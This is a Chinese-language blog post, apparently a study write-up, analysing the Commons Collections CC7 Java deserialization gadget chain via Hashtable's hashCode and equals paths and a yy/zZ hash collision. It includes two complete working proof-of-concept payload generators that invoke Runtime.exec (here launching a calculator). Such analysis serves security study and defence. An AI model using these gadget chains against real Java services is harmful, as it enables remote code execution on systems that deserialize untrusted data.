---
title: "Java反序列化-CC7"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# Java反序列化-CC7

cc7的思路同样是找了另一条调用链来触发Lazy.get方法

## HashTable()

Hashtable 与 HashMap很相似，都是一种key-value形式的哈希表，但是还是有区别：

- HashMap 与 Hashtable的父类不一样。
- 两者内部基本都是使用“数组-链表”的结构，但是 HashMap 引入了红黑树的实现。
- Hashtable 的key-value 不允许为null值，但是HashMap 是允许的，后者会将 key=value的实体放在index=0 的位置。
- Hashtable 线程安全，HashMap 线程不安全。

同样的，既然HashMap可以实现反序列化漏洞，Hashtable同样可以。

分析源码，这个Hashtable类可以给出两条链，分别是

- `readObject()`中的`reconstitution()`的`hashCode()`方法
- `readObject()`中的`reconstitution()`的`equals()`方法

## hashCode链

先看一下Hashtable的readObject()方法：

![QQ_1761900711507](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761900711507.png)

最后的循环里使用了reconstitutionPut方法，将反序列化得到的key-value 放在内部实现的 Entry 数组 table里

再看看这个reconstitutionPut方法：

![QQ_1761900781192](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761900781192.png)

这里调用了key.hashCode，key同样是我们可控，那么思路就和CC6一样了，只不过是把HashMap换成了HashTable，构造一下：

~~~java
package com.yuy0ung;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CommonsCollections7_HashTable {
    public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, NoSuchFieldException {
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]} ),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]} ),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a calculator"}),
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        Hashtable innerTable = new Hashtable();
//        Map innerMap = new HashMap();
        Map outerTable = LazyMap.decorate(innerTable, transformerChain);

        TiedMapEntry tme = new TiedMapEntry(outerTable, "Yuy0ung");

        Map evilMap = new HashMap();
        evilMap.put(tme,"Yuy1ung");

        outerTable.remove("Yuy0ung");
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain,transformers);

        serialize(evilMap);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String fileName) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));
        Object obj = ois.readObject();
        return obj;
    }
}
~~~

成功触发命令执行：

![QQ_1761901210996](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761901210996.png)

## equals链

上面的链子只能说是CC6的修改链，这个equals链才是ysoserial上面的链子

### 逻辑梳理

同样是从Hashtable的readObject()方法入手，进入到reconstitutionPut方法：

![QQ_1761902119323](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761902119323.png)

注意这里的equals方法，进入for语句，然后就是个if判断语句了，执行了`e.hash`和`e.key.equals(key)`，不过Java语言还存在一个布尔短路运输的特性，也就是说当`e.hash == hash`判定为假，就会直接退出if语句，导致不执行`e.key.equals(key)`，所以我们还得让`e.hash == hash`为真

我们分析上面的代码可知，这里大概意思就是先计算出key的hash值，然后根据hash值计算存储索引index，再通过for循环得到e.next也就是上一个map键值对，最后进入if判断比较两者hash值是否相同，不同就把这个键值对加入到tab中。当然我们想要的是两个键值对的key的hash相同。这里是循环添加键值对到tab中，很显然当只有一个键值对的时候，hash肯定不相同，我们需要至少两个键值对，当第一个键值对添加后，第二个和第一个进行比较，所以要执行两次put语句
到这里我们可能会想：是不是直接把两个键值对的key值改为一样就行了，回到readObject中：

![QQ_1761902587336](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761902587336.png)

看到最下面还原table数组时是根据`elements`来判断的，而如果key相同时 element 计算会把两个 map 计算为只有一个 map，那么此时就需要用到哈希碰撞

继续往下，如果上面的条件都满足了，就会进入e.key.equals方法，我们会将e.key设置为LazyMap对象，但它没有equals方法，于是向其父类寻找，调用到`AbstractMapDecorator`类的`equals`方法：

![QQ_1761903224651](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761903224651.png)

此处会调用`map.equals()`，按照我们先前poc的逻辑，为了让LazyMap触发transform方法，我们会用LazyMap来包装：
~~~java
LazyMap.decorate(map,chainedTransformer);
~~~

而这里的map就是HashMap，HashMap中同样没有equals方法，所以向上调用到AbstractMap#equals：
![QQ_1761903938374](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761903938374.png)

注意到这里的`value.equals(m.get(key)`，当value不为null即可进入这一步，而如果我们将m设置为LazyMap对象，整条链子就打通了，溯源这个m，发现要设置key为LazyMap对象：

![QQ_1761904111441](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761904111441.png)

也就是说e.key和key都要为LazyMap对象，并且key.hashcode要相同，但上面提到了两个键值对的key不能相同，而这里key.hashcode又是怎么计算的呢？后面调试会发现key.hashcode传入的是数组的话，最后的hash值是key的hash值异或value的hash值

那么所以还是只用让为LazyMap对象中map键值对的key不同而其hash值相同就行了，value就设为一样的就行（因为也要保证其hash值一样，说白了就哈希碰撞，那么接下来开始构造

### 构造

回顾上面分析的步骤：

* 需要用put编写进两个键值对，键都为LazyMap对象，以保证key实参为LazyMap对象，e.key也为LazyMap对象

* 由于Java布尔值短路特性，还需解决hash相等问题，从而执行equals方法

哈希碰撞可以使用yy和zZ来绕过：

~~~java
Map innerMap1 = new HashMap();
Map innerMap2 = new HashMap();
		
Map outerMap1 = LazyMap.decorate(innerMap1, transformerChain);
outerMap1.put("yy", 1);
		
Map outerMap2 = LazyMap.decorate(innerMap2, transformerChain);
outerMap2.put("zZ", 1);

Hashtable table = new Hashtable();
table.put(outerMap1, 1);
table.put(outerMap2, 2);
~~~

值得注意的是我的fakeTransformers写法如下：

~~~java
Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
~~~

而outerMap两次put后都返回1，当innerMap中的键的hashCode相同时，Hashtable.readObject会认为这是两个一样的对象，只执行在readObject的一次循环，导致只执行一次reconstitutionPut方法

所以需要修改fakeTransformers，将其置空：

~~~java
Transformer[] faketransformers = new Transformer[] {};
~~~

另外，每执行一次outerMap.put，都会触发一次Lazy.get方法，进入if后会向当前map中添加键值对：

![QQ_1761906821327](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761906821327.png)

这会导致outerMap2会有两个元素，多出一个key为yy的键值对，问题出在AbstractMap的equals方法：

![QQ_1761906886661](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761906886661.png)

此处的长度判断需要长度判断需要m.size()为1，所以我们还需要remove一个元素：

~~~java
outerMap2.remove("yy");
~~~

所以最终代码：

~~~java
package com.yuy0ung;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.AbstractMapDecorator;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.AbstractMap;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CommonsCollections7_HashTable {
    public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, NoSuchFieldException {
        Transformer[] fakeTransformers = new Transformer[] {};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]} ),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]} ),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a calculator"}),
                new ConstantTransformer(1)
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        Map outerMap1 = LazyMap.decorate(innerMap1, transformerChain);
        outerMap1.put("yy", 1);

        Map outerMap2 = LazyMap.decorate(innerMap2, transformerChain);
        outerMap2.put("zZ", 1);

        Hashtable table = new Hashtable();
        table.put(outerMap1, 1);
        table.put(outerMap2, 2);

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain,transformers);

        outerMap2.remove("yy");

        serialize(table);
        unserialize("ser.bin");

    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String fileName) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));
        Object obj = ois.readObject();
        return obj;
    }
}
~~~

成功命令执行：

![](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761908388784.png)